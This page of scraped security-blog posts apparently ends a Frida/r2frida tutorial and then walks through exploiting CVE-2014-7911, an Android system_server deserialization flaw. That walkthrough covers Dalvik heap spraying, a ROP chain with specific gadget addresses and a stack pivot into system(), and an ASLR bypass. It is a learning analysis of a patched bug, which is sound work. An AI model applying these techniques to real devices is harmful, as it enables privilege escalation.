<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Starting script</span><br><span class="line">[*] Instance found: android.widget.EditText&#123;78e1fa3 VFED..CL. .F....ID 710,245-1440,383 #7f08002b app:id&#x2F;welcome_editt&#125;</span><br><span class="line">[*] Instance found: android.widget.EditText&#123;3952a0 VFED..CL. ......ID 710,488-1440,626 #7f08002d app:id&#x2F;welcome_editte&#125;</span><br><span class="line">[*] Instance found: android.widget.EditText&#123;7551e59 VFED..CL. .F...... 710,245-1440,383 #7f08002b app:id&#x2F;welcome_editt&#125;</span><br><span class="line">[*] Instance found: android.widget.EditText&#123;533a1e VFED..CL. ........ 710,488-1440,626 #7f08002d app:id&#x2F;welcome_editte&#125;</span><br><span class="line">[*] Finished heap search</span><br></pre></td></tr></table></figure>
<p>Frida实际上调用了<code>android.widget.EditText</code>对象实例的toString方法。借助Frida，我们可以读取进程内存、修改函数、查找对象实例。Frida的基本使用就是这样，可以通过其官网的Docs深入学习。</p>
<h2 id="使用Frida和Redare2：r2frida"><a href="#使用Frida和Redare2：r2frida" class="headerlink" title="使用Frida和Redare2：r2frida"></a>使用Frida和Redare2：r2frida</h2><p>还可以使用<code>Radare2</code>反汇编框架来检查应用程序的内存，方法是通过<code>r2frida</code>将<code>Radare2</code>连接到Frida，然后对进程的内存进行静态分析和反汇编处理。之前<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/06/20/radare2%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">简单介绍过Radare2</a>，还是要抽时间再多学习补充一下。<br>安装<code>Radare2</code>后，可以用Radare2的数据包管理程序来安装<code>r2frida</code>：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ r2pm install r2frida</span><br></pre></td></tr></table></figure>
<p>回到前面frida-trace的例子，还是输出内存地址：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -i open -U -f com.mwr.example.sieve</span><br><span class="line">Instrumenting functions...</span><br><span class="line">open: Loaded handler at &quot;&#x2F;Users&#x2F;fan&#x2F;__handlers__&#x2F;libc.so&#x2F;open.js&quot;</span><br><span class="line">Started tracing 1 function. Press Ctrl+C to stop.</span><br><span class="line">           &#x2F;* TID 0x18cd *&#x2F;</span><br><span class="line">   208 ms  open(pathname&#x3D;0xa7137e65, flags&#x3D;0x80002)</span><br><span class="line">           &#x2F;* TID 0x18e1 *&#x2F;</span><br><span class="line">   232 ms  open(pathname&#x3D;0xa662cc2c, flags&#x3D;0x2)</span><br><span class="line">           &#x2F;* TID 0x18e2 *&#x2F;</span><br><span class="line">   250 ms  open(pathname&#x3D;0xa662cc2c, flags&#x3D;0x2)</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>使用r2frida显示内存地址的内容并读取路径名：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ r2 frida:&#x2F;&#x2F;emulator-5554&#x2F;com.mwr.example.sieve</span><br><span class="line"> -- Run .dmm* to load the flags of the symbols of all modules loaded in the debugger</span><br><span class="line">[0x00000000]&gt; s 0xa7137e65</span><br><span class="line">[0xa7137e65]&gt; px</span><br><span class="line">- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span><br><span class="line">0xa7137e65  2f64 6576 2f62 696e 6465 7200 4269 6e64  &#x2F;dev&#x2F;binder.Bind</span><br><span class="line">0xa7137e75  6572 2069 6f63 746c 2074 6f20 6f62 7461  er ioctl to obta</span><br><span class="line">0xa7137e85  696e 2076 6572 7369 6f6e 2066 6169 6c65  in version faile</span><br><span class="line">0xa7137e95  643a 2025 7300 4269 6e64 6572 2064 7269  d: %s.Binder dri</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3641.html">http://bobao.360.cn/learning/detail/3641.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/05/01/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/05/01/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">CVE-2014-7911 Android提权漏洞（二）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-05-01 23:25:51" itemprop="dateCreated datePublished" datetime="2017-05-01T23:25:51+08:00">2017-05-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>上一篇文章<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/04/29/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/">CVE-2014-7911 Android提权漏洞（一）</a>中对CVE-2014-7911这个漏洞的原理和PoC进行了学习，通过学习这个漏洞感觉还是很有收获，因为之前只是做过CTF比赛中的题目，没太接触过实际的漏洞分析，所以通过这次学习不仅将之前学到的知识用到了实践，还对真实世界的漏洞有了初步了解。<br>这篇文章继续对这个漏洞的利用进行学习，最终目标是利用这个漏洞以system权限执行代码。<br>前情回顾，这个漏洞是利用Java反射和Binder进程间通信机制，向<code>system_server</code>传入一不可序列化的恶意对象，由于<code>java.io.ObjectInputStream</code>未对该输入的对象实例是否实际可序列化做校验，因此当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被当作由native代码处理的指针，使攻击者获得控制权。</p>
<h2 id="Dalvik-heap-Spray"><a href="#Dalvik-heap-Spray" class="headerlink" title="Dalvik-heap Spray"></a>Dalvik-heap Spray</h2><p>为了能可靠稳定地跳转到攻击者的提权代码，需要使用堆喷射技术，在<code>system_server</code>内存空间的<code>Dalvik-heap</code>中预先布置大量的<code>Spray Buffer</code>，其中放置提权代码以及大量指向该提权代码的地址。这里需要解决两个问题：</p>
<ul>
<li>向system_server的Dalvik-heap空间传入可控字符串</li>
<li>构造特殊布局的Spray Buffer，使代码能稳定执行</li>
</ul>
<p>1.向Dalvik-heap传入字符串<br><code>system_server</code>向Android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向<code>system_server</code>传入字符串，同时<code>system_server</code>把这些字符串存储在<code>Dalvik-heap</code>中，在GC之前都不会销毁。<br>如<code>android.content.Context</code>中的<code>registerReceiver()</code>  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span> <span class="params">(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)</span></span></span><br></pre></td></tr></table></figure>
<p>其中，<code>broadcastPermission</code>为String类型，调用该方法后，String Buffer将常驻<code>system_server</code>进程空间。调用链如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ContextWrapper.registerReceiver</span><br><span class="line">-&gt;ContextImpl.registerReceiver</span><br><span class="line">-&gt;ContextImpl.registerReceiverInternal</span><br><span class="line">-&gt;ActivityManagerProxy.registerReceiver</span><br><span class="line">-&gt;ActivityManagerService.registerReceiver</span><br></pre></td></tr></table></figure>
<p>可以看出从应用程序的Context就能通过binder IPC跨进程调用<code>system_server</code>的<code>ActivityManagerService.registerReceiver()</code>。<br><code>ActivityManagerService</code>常驻<code>system_server</code>进程空间，其<code>registerReceiver()</code>实现如下：<br><strong>代码清单</strong> <a target="_blank" rel="noopener" href="http://androidxref.com/4.4_r1/xref/frameworks/base/services/java/com/android/server/am/ActivityManagerService.java#12764">/frameworks/base/services/java/com/android/server/am/ActivityManagerService.java</a>  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, <span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line">    enforceNotIsolatedCaller(<span class="string">&quot;registerReceiver&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> callingUid;</span><br><span class="line">    <span class="keyword">int</span> callingPid;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">        ......</span><br><span class="line">        ReceiverList rl</span><br><span class="line">            = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</span><br><span class="line">        ......</span><br><span class="line">        BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage,</span><br><span class="line">            permission, callingUid, userId); <span class="comment">//在Dalvik-heap中分配内存</span></span><br><span class="line">        rl.add(bf);</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> sticky;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过上述代码中的<code>new</code>就能在<code>system_server</code>进程的<code>Dalvik-heap</code>中分配String Buffer了。<br>2.构造特殊布局的Spray Buffer<br>攻击者可控的<code>mOrgue</code>需要指向一个可读的内存区域，让其指向传入<code>registerReceiver()</code>的<code>broadcastPermission</code>参数所属的地址区域并在<code>broadcastPermission</code>中布置ROP Gadget即可。但是<code>system_server</code>在其<code>Dalvik-heap</code>中分配<code>String Buffer</code>的地址是未知的，因此<code>mOrgue</code>未必能命中<code>Dalvik-heap</code>中的<code>String Buffer</code>。为了提高命中率，需要在<code>Dalvik-heap</code>中分配大量的<code>String Buffer</code>，这就是<code>Heap Spray</code>（堆喷射）。反复调用<code>registerReceiver()</code>分配大量的<code>String Buffer</code>即可完成<code>Heap Spray</code>，但是因为<code>String Buffer</code>地址未知，这就需要构造一种特殊的堆喷射布局：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">STATIC_ADDRESS &#x3D; mOrgue</span><br><span class="line">+---------------------------------+&lt;------低地址（堆底地址）</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset    |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-4  |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-8  |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|              ...                |      Relative Address Chunk</span><br><span class="line">+---------------------------------+&lt;-堆底地址+4N</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-4N |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|              ...                |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|               1                 |</span><br><span class="line">+---------------------------------+&lt;------堆底地址+Gadget_offset</span><br><span class="line">|                                 |</span><br><span class="line">|              Gadget             |      Gadget Buffer</span><br><span class="line">|                                 |</span><br><span class="line">+---------------------------------+&lt;------高地址</span><br><span class="line"></span><br><span class="line">大量分配这样的堆块，其中，每个堆块有Relative Address Chunk和Gadget Buffer两部分。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>之前的思路是在<code>Relative Address Chunk</code>中都放入<code>GADGET_BUFFER</code>（即<code>Gadget Buffer</code>的地址），但是这个地址在每个堆块中都不一样，而且也无法在跨进程传入<code>system_server</code>之前知道，因此不能这样简单构造。</p>
</blockquote>
<p>如上图所示，这里的布局是在<code>Relative Address Chunk</code>中，按地址增长的方向依次放入递减的地址值，这样给定一个<code>STATIC_ADDRESS</code>，只要其落在某个<code>Relative Address Chunk</code>的地址范围，就一定有<code>[STATIC_ADDRESS] = GADGET_BUFFER</code>，推导如下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">已知：  </span><br><span class="line">GADGET_BUFFER &#x3D; 堆底地址 + Gadget_offset（GADGET_BUFFER相对于堆底的偏移）</span><br><span class="line">STATIC_ADDRESS &#x3D; 堆底地址 + 4N（考虑到四字节对齐，STATIC_ADDRESS一般为堆底地址加上4的整数倍的一个数）</span><br><span class="line">因此：  </span><br><span class="line">[STATIC_ADDRESS] &#x3D; [堆底地址 + 4N]</span><br><span class="line">                 &#x3D; STATIC_ADDRESS + Gadget_offset - 4N</span><br><span class="line">                 &#x3D; 堆底地址 + 4N + Gadget_offset - 4N</span><br><span class="line">                 &#x3D; 堆底地址 + Gadget_offset</span><br><span class="line">                 &#x3D; GADGET_BUFFER</span><br></pre></td></tr></table></figure>
<p>而且上述布局还满足<code>[STATIC_ADDRESS + 4N] = GADGET_BUFFER - 4N</code>（这个条件在后面布置Gadget时会用到），因为<code>STATIC_ADDRESS</code>每加4，对应地址里的值就会减4，如：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[STATIC_ADDRESS + 4] &#x3D; STATIC_ADDRESS + Gadget_offset - 4N - 4 &#x3D; GADGET_BUFFER - 4</span><br><span class="line">[STATIC_ADDRESS + 8] &#x3D; STATIC_ADDRESS + Gadget_offset - 4N - 8 &#x3D; GADGET_BUFFER - 8</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>为了提高<code>STATIC_ADDRESS</code>落入<code>Relative Address Chunk</code>的可能性，需要满足：<br>1.每一个堆块的Relative Address Chunk比Gadget Buffer大很多；<br>2.分配大量的这样的堆块<br>按照这样布局，再看汇编代码，布置Gadget Buffer：  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldr</span> <span class="built_in">r4</span>, [<span class="built_in">r0</span>, <span class="number">#4</span>]    # <span class="built_in">r0</span> = STATIC_ADDRESS---&gt;<span class="built_in">r4</span> = [STATIC_ADDRESS + <span class="number">4</span>] = GADGET_BUFFER - <span class="number">4</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r6</span>, <span class="built_in">r1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r4</span>          # <span class="built_in">r0</span> = GADGET_BUFFER - <span class="number">4</span></span><br><span class="line"><span class="keyword">blx</span> &lt;android_atomic_dec()&gt;</span><br></pre></td></tr></table></figure>
<p>调用android_atomic_dec函数之后  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmp</span> <span class="built_in">r0</span>, <span class="number">#1</span>            # <span class="built_in">r0</span> = [GADGET_BUFFER-<span class="number">4</span>]</span><br><span class="line"><span class="keyword">bne</span> loc_d19c</span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>, [<span class="built_in">r4</span>, <span class="number">#8</span>]      # <span class="built_in">r0</span> = [GADGET_BUFFER-<span class="number">4</span>+<span class="number">8</span>] = [GADGET_BUFFER+<span class="number">4</span>]</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">r1</span>, <span class="built_in">r6</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r0</span>]          # <span class="built_in">r3</span> = [[GADGET_BUFFER + <span class="number">4</span>]]</span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r3</span>, <span class="number">#0xc</span>]    # <span class="built_in">r2</span> = [[[GADGET_BUFFER + <span class="number">4</span>]] + <span class="number">12</span>]</span><br><span class="line"><span class="keyword">blx</span> <span class="built_in">r2</span></span><br></pre></td></tr></table></figure>
<p>为了进入<code>blx r2</code>这条分支，<code>r0</code>必须等于1，也就是<code>[GADGET_BUFFER - 4] = 1</code>；<br>为了<code>blx r2</code>跳转到<code>GADGET_BUFFER</code>里的内容执行（即<code>r2 = [GADGET_BUFFER]</code>），需要令<code>[[GADGET_BUFFER + 4]] + 12 = GADGET_BUFFER</code>，只要令<code>[GADGET_BUFFER + 4] = STATIC_ADDRESS + 12</code>即可。</p>
<h2 id="ROP-Chain"><a href="#ROP-Chain" class="headerlink" title="ROP Chain"></a>ROP Chain</h2><p>由于Android使用了<code>DEP</code>，因此<code>Dalvik-heap</code>内存里的数据不能执行，这就必须使用ROP技术，使PC跳转到一系列合法的指令序列（Gadget）。这里要用Gadget调用system函数执行代码。<br>使用<code>ROPGadget</code>，在<code>zygote</code>加载的基础模块（如libc.so、libwebviewchromium.so、libdvm.so）上进行搜索，把<code>ARM code</code>当做<code>Thumb code</code>来搜索，可以增加更多的候选指令序列。<br>为了调用system函数，需要控制<code>r0</code>寄存器，指向我们预先布置的命令行字符串作为参数。这里需要使用<code>Stack Pivot</code>技术，将栈顶指针<code>SP</code>指向控制的<code>Dalvik-heap</code>堆中的数据，这将为控制<code>PC</code>寄存器、以及在栈上布置数据带来便利。利用  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --thumb --binary libwebviewchromium.so</span><br></pre></td></tr></table></figure>
<p>可找到如下Gadget<br><strong>Gadget1</strong><br>为Stack Pivot做准备<br>libwebviewchromium.so  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">70</span>a93c:       <span class="number">682</span>f            <span class="keyword">ldr</span>     <span class="built_in">r7</span>, [<span class="built_in">r5</span>, <span class="number">#0</span>]  # <span class="built_in">r5</span> = STATIC_ADDRESS, <span class="built_in">r7</span> = [STATIC_ADDRESS] = GADGET_BUFFER</span><br><span class="line"><span class="number">70</span>a93e:       <span class="number">4628</span>            <span class="keyword">mov</span>     <span class="built_in">r0</span>, <span class="built_in">r5</span>       # <span class="built_in">r0</span> = STATIC_ADDRESS</span><br><span class="line"><span class="number">70</span>a940:       <span class="number">68</span>b9            <span class="keyword">ldr</span>     <span class="built_in">r1</span>, [<span class="built_in">r7</span>, <span class="number">#8</span>] # <span class="built_in">r1</span> = [GADGET_BUFFER+<span class="number">8</span>]</span><br><span class="line"><span class="number">70</span>a942:       <span class="number">4788</span>            <span class="keyword">blx</span>     <span class="built_in">r1</span></span><br></pre></td></tr></table></figure>
<p>因此，<code>GADGET_BUFFER+8</code>这个地址需要指向第二个Gadget<br><strong>Gadget2</strong><br>Stack Pivot<br>libdvm.so  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">664</span><span class="built_in">c4</span>:       f107 <span class="number">0708</span>       add.w   <span class="built_in">r7</span>, <span class="built_in">r7</span>, <span class="number">#8</span>   # <span class="built_in">r7</span> = <span class="built_in">r7</span> + <span class="number">8</span> = GADGET_BUFFER + <span class="number">8</span></span><br><span class="line"><span class="number">664</span><span class="built_in">c8</span>:       <span class="number">46</span>bd            <span class="keyword">mov</span>     <span class="built_in">sp</span>, <span class="built_in">r7</span>       <span class="symbol">#sp</span> = GADGET_BUFFER + <span class="number">8</span></span><br><span class="line"><span class="number">664</span>ca:       bdb0            <span class="keyword">pop</span>     &#123;<span class="built_in">r4</span>, <span class="built_in">r5</span>, <span class="built_in">r7</span>, <span class="built_in">pc</span>&#125;</span><br><span class="line"><span class="comment"># r4=[GADGET_BUFFER+8],r5=[GADGET_BUFFER+12],r7=[GADGET_BUFFER+16],pc=[GADGET_BUFFER+20], sp=GADGET_BUFFER+24</span></span><br></pre></td></tr></table></figure>
<p>可以看到，将<code>SP</code>指向堆中可控的数据后，后面就可以控制<code>PC</code>。这里，我们提前将system函数的地址写入<code>[GADGET_BUFFER+12]</code>。为什么要通过Gadget1的过渡才能来到Gadget2，事实上这是不得已而为之，使用ROPGadget搜遍<code>/system/lib</code>下的基础模块<code>grep &quot;mov sp, r&quot;</code>，只发现<code>mov sp, r7</code>，因此只能采取这种过渡的方式。<br>接下来，在<code>GADGET_BUFFER+20</code>这个地址填入Gadget3的地址。<br><strong>Gadget3</strong><br>libwebviewchromium.so  </p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">30</span>c4b8:       <span class="number">4668</span>            <span class="keyword">mov</span>     <span class="built_in">r0</span>, <span class="built_in">sp</span>   # <span class="built_in">r0</span> = GADGET_BUFFER + <span class="number">24</span></span><br><span class="line"><span class="number">30</span>c4ba:       <span class="number">47</span>a8            <span class="keyword">blx</span>     <span class="built_in">r5</span>       # <span class="built_in">r5</span> = [GADGET_BUFFER+<span class="number">12</span>] = system_addr</span><br></pre></td></tr></table></figure>
<p>因此，提前将system函数的参数放入r0指向的GADGET_BUFFER+24即可，最终将以system_server的权限执行任意代码。<br>最终的chunk布局如图。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------------+&lt;------低地址（堆底地址）</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset    |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-4  |</span><br><span class="line">+---------------------------------+</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-8  |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|              ...                |      Relative Address Chunk</span><br><span class="line">+---------------------------------+</span><br><span class="line">| STATIC_ADDRESS+Gadget_offset-4N |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|              ...                |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|               1                 |</span><br><span class="line">+---------------------------------+&lt;------堆底地址+Gadget_offset</span><br><span class="line">|         Gadget1_Address         |</span><br><span class="line">+---------------------------------+ +4</span><br><span class="line">|       STATIC_ADDRESS+12         | 上一节分析的，使blx r2跳转到GADGET_BUFFER的条件</span><br><span class="line">+---------------------------------+ +8</span><br><span class="line">|         Gadget2_Address         |</span><br><span class="line">+---------------------------------+ +12</span><br><span class="line">|         system_Address          |     Gadget Buffer</span><br><span class="line">+---------------------------------+ +16</span><br><span class="line">|             PADDING             |</span><br><span class="line">+---------------------------------+ +20</span><br><span class="line">|         Gadget3_Address         |</span><br><span class="line">+---------------------------------+ +24</span><br><span class="line">|      &quot;id &gt; &#x2F;data&#x2F;pwned.txt&quot;     | system函数的参数</span><br><span class="line">+---------------------------------+&lt;------高地址</span><br></pre></td></tr></table></figure>
<p>最后，构造ROP Chain还需要考虑一个细节，ARM有两种模式Thumb和ARM模式，我们使用的Gadgets均为Thumb模式，因此其地址的最低位均需要加1。</p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>Android自4.1始开始启用<code>ASLR</code>（地址随机化），任何程序自身的的地址空间在每一次运行时都将发生变化。但在Android中，攻击程序、<code>system_server</code>皆由<code>zygote</code>进程fork而来，因此攻击程序与system_server共享同样的基础模块和Dalvik-heap。只要在使用Dalvik-heap Spray和构建ROP Gadget时，只使用libc、libdvm这些基础模块，就无需考虑地址随机化的问题。通过对攻击程序自身<code>/proc/&lt;pid&gt;/maps</code>文件的解析，就可以得知所加载基础模块的基址。如图，<br><img src="/images/cve-2014-7911/aslr.png"><br>根据上述Gadgets构建的<a target="_blank" rel="noopener" href="https://github.com/heeeeen/CVE-2014-7911poc">POC</a> ，执行完毕后，将以system用户的权限在/data目录下生成一个<code>pwned.txt</code>文件。</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>见<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0">Google的diff</a>，涉及与反序列化相关的 ObjectInputStream.java、ObjectStreamClass.java、ObjectStreamConstants.java、SerializationTest.java等文件。主要加了三种检查：</p>
<ul>
<li>检查反序列化的类是否仍然满足序列化的需求；</li>
<li>检查反序列化的类的类型是否与stream中所持有的类型信息 (enum, serializable, externalizable)一致；</li>
<li>在某些情形下，延迟类的静态初始化，直到对序列化流的内容检查完成。</li>
</ul>
<p>漏洞的原理和利用都学习完了，但是还是觉得差的很多，主要原因是没有对利用过程进行调试，后面要学习以下Android源码的调试，对漏洞利用有一个更深刻的理解。<br><strong>reference</strong><br>再论CVE-2014-7911安卓序列化漏洞 by 小荷才露尖尖角</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/04/29/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/04/29/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">CVE-2014-7911 Android提权漏洞（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-04-29 08:59:25" itemprop="dateCreated datePublished" datetime="2017-04-29T08:59:25+08:00">2017-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
